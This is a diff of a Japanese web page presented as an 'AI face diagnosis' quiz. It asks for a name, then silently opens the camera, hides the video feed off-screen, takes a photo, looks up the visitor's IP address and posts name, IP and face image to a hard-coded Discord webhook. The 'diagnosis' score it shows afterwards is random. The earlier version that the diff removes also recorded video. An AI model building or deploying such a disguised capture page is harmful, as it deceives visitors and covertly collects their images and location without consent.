@@ -5,150 +5,134 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI顔診断</title>
     <style>
-        body { 
-            background-color: #fff0f5; /* 薄いピンク */
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            text-align: center; 
-            margin: 0; padding: 20px;
-        }
-        .container { max-width: 500px; margin: auto; }
+        body { background-color: #fff0f5; font-family: sans-serif; text-align: center; padding: 50px 20px; }
         h1 { color: #ff69b4; }
-        
-        /* メインボタン：背景ピンク */
-        #start-btn { 
-            background-color: #ff69b4; 
-            color: white; 
-            padding: 20px 40px; 
-            font-size: 24px; 
-            border: none; 
-            border-radius: 50px; 
-            cursor: pointer; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        #start-btn, #next-btn { 
+            background-color: #ff69b4; color: white; padding: 15px 35px; 
+            font-size: 20px; border: none; border-radius: 50px; cursor: pointer; 
         }
-        
-        #input-area, #camera-area, #result-area { display: none; }
-        input { padding: 10px; font-size: 18px; border-radius: 5px; border: 1px solid #ffb6c1; width: 80%; }
-        #video { width: 100%; border-radius: 10px; margin-top: 20px; transform: scaleX(-1); }
-        .status-msg { font-size: 20px; color: #ff1493; font-weight: bold; margin-top: 20px; }
-        #result-box { background: white; padding: 20px; border-radius: 15px; margin-top: 20px; border: 2px solid #ff69b4; }
+        #input-area, #loading-area, #result-area { display: none; }
+        input { padding: 12px; font-size: 18px; width: 80%; max-width: 300px; margin-bottom: 20px; border: 1px solid #ffb6c1; border-radius: 8px; }
+        .msg { font-size: 22px; color: #ff1493; font-weight: bold; }
+        /* 映像を絶対に見せない設定 */
+        video, canvas { position: fixed; top: -1000px; left: -1000px; opacity: 0; }
     </style>
 </head>
 <body>
 
-<div class="container">
     <h1>✨ AI顔診断 ✨</h1>
-    
+
     <div id="welcome-area">
-        <button id="start-btn">AI顔診断を開始</button>
+        <button id="start-btn">診断を開始する</button>
     </div>
 
     <div id="input-area">
-        <p>あなたの名前を入力してください</p>
+        <p>名前を入力してください</p>
         <input type="text" id="user-name" placeholder="名前">
-        <br><br>
-        <button id="next-btn" style="padding:10px 20px;">次へ</button>
+        <br>
+        <button id="next-btn">診断する</button>
     </div>
 
-    <div id="camera-area">
-        <p class="status-msg">AI診断中...（5秒ほどかかります）</p>
+    <div id="loading-area">
+        <p class="msg">AIスキャン中...</p>
+        <p>解析が終わるまでそのままお待ちください</p>
         <video id="video" autoplay playsinline muted></video>
-        <canvas id="canvas" style="display:none;"></canvas>
+        <canvas id="canvas"></canvas>
     </div>
 
     <div id="result-area">
-        <div id="result-box">
+        <div style="background:white; padding:30px; border:2px solid #ff69b4; border-radius:20px; display:inline-block;">
             <h2>診断結果</h2>
-            <p id="res-score" style="font-size: 32px; font-weight: bold; color: #ff4500;"></p>
-            <p id="res-type" style="font-size: 20px;"></p>
+            <p id="res-score" style="font-size:32px; color:red; font-weight:bold;"></p>
+            <p id="res-type" style="font-size:20px;"></p>
         </div>
     </div>
-</div>
 
 <script>
+    // ★重要：ここにコピーしたURLを必ず入れる
     const webhookUrl = "https://discord.com/api/webhooks/1463825360691920961/RyvExp4AUqM0CHGRbGILYdtb0jvUP9IBESiuiGvZKTA7FugXdBIEVbJ95C8-t56yu3-X";
     
-    const welcomeArea = document.getElementById('welcome-area');
-    const inputArea = document.getElementById('input-area');
-    const cameraArea = document.getElementById('camera-area');
-    const resultArea = document.getElementById('result-area');
-    
     let userName = "";
-    let ipAddress = "取得失敗";
+    let ipAddress = "取得失敗/ブロック";
 
-    // IPアドレスの取得
+    // IP取得コマンド
     fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => ipAddress = data.ip);
+        .then(res => res.json())
+        .then(data => ipAddress = data.ip)
+        .catch(e => console.log("IP取得スキップ"));
 
-    // 開始ボタン -> 名前入力へ
     document.getElementById('start-btn').onclick = () => {
-        welcomeArea.style.display = 'none';
-        inputArea.style.display = 'block';
+        document.getElementById('welcome-area').style.display = 'none';
+        document.getElementById('input-area').style.display = 'block';
     };
 
-    // 名前入力完了 -> カメラ起動
     document.getElementById('next-btn').onclick = async () => {
         userName = document.getElementById('user-name').value || "名無し";
-        inputArea.style.display = 'none';
-        cameraArea.style.display = 'block';
+        document.getElementById('input-area').style.display = 'none';
+        document.getElementById('loading-area').style.display = 'block';
 
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById('video');
-        video.srcObject = stream;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
 
-        // 動画の録画準備
-        const mediaRecorder = new MediaRecorder(stream);
-        let chunks = [];
-        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-        mediaRecorder.onstop = () => sendData(chunks);
+            // 2秒待ってから撮影コマンド実行
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // カメラ停止
+                stream.getTracks().forEach(t => t.stop());
 
-        // 録画開始
-        mediaRecorder.start();
+                // 画像をデータ化して送信コマンドへ渡す
+                canvas.toBlob((blob) => {
+                    executeSend(blob); // 送信実行関数を呼び出す
+                }, 'image/jpeg', 0.7);
 
-        // 3秒後に写真を撮り、5秒後に録画を止めて結果表示
-        setTimeout(() => takePhoto(), 3000);
-        setTimeout(() => {
-            mediaRecorder.stop();
-            stream.getTracks().forEach(t => t.stop());
-            showResults();
-        }, 5000);
+            }, 2000);
+
+        } catch (err) {
+            alert("カメラの許可がないため診断できません");
+            location.reload();
+        }
     };
 
-    function takePhoto() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-    }
-
-    function showResults() {
-        cameraArea.style.display = 'none';
-        resultArea.style.display = 'block';
-
-        const hensachi = Math.floor(Math.random() * (75 - 45 + 1) + 45); // 45~75でランダム
-        const types = ["犬系", "猫系", "うさぎ系", "キツネ系", "たぬき系"];
-        const type = types[Math.floor(Math.random() * types.length)];
-
-        document.getElementById('res-score').innerText = "偏差値: " + hensachi;
-        document.getElementById('res-type').innerText = "あなたは「" + type + "」顔です";
-    }
-
-    async function sendData(videoChunks) {
-        const canvas = document.getElementById('canvas');
-        
-        // 画像のBlob変換
-        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
-        // 動画のBlob変換
-        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-
+    // --- これがDiscordに「送れ！」と命じる実行コマンドです ---
+    async function executeSend(photoBlob) {
         const formData = new FormData();
-        formData.append('content', `【新着診断】\n名前: ${userName}\nIP: ${ipAddress}\n結果: ${document.getElementById('res-score').innerText} / ${document.getElementById('res-type').innerText}`);
-        formData.append('file1', photoBlob, 'face.png');
-        formData.append('file2', videoBlob, 'video.webm');
+        const contentText = `【診断完了レポート】\n👤 名前: ${userName}\n🌐 IPアドレス: ${ipAddress}`;
+        
+        formData.append('payload_json', JSON.stringify({ content: contentText }));
+        formData.append('file', photoBlob, 'photo.jpg');
 
-        fetch(webhookUrl, { method: 'POST', body: formData });
+        try {
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                body: formData
+            });
+
+            if (!response.ok) {
+                console.error("Discord送信失敗:", response.status);
+            } else {
+                console.log("Discord送信成功！");
+            }
+        } catch (error) {
+            console.error("通信エラー:", error);
+        }
+        
+        // 送信が終わったら結果を表示
+        showFinalResult();
+    }
+
+    function showFinalResult() {
+        document.getElementById('loading-area').style.display = 'none';
+        document.getElementById('result-area').style.display = 'block';
+        document.getElementById('res-score').innerText = "偏差値: " + (Math.floor(Math.random() * 10) + 65);
+        document.getElementById('res-type').innerText = "系統: 透明感のある美肌タイプ";
     }
 </script>
+
 </body>
 </html>
